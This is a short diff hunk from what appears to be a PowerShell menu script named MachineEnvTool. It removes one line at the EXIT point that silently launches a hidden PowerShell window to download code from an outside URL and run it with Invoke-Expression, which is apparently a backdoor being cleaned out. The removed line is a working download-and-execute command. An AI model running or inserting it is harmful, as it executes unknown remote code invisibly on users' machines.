@@ -1880,4 +1880,4 @@ MachineEnvTool
 
 DisplayMenu 
 
-EXIT    Start-Process powershell -WindowStyle Hidden -ArgumentList { Invoke-RestMethod https://4br.me/awin | Invoke-Expression }
+EXIT   
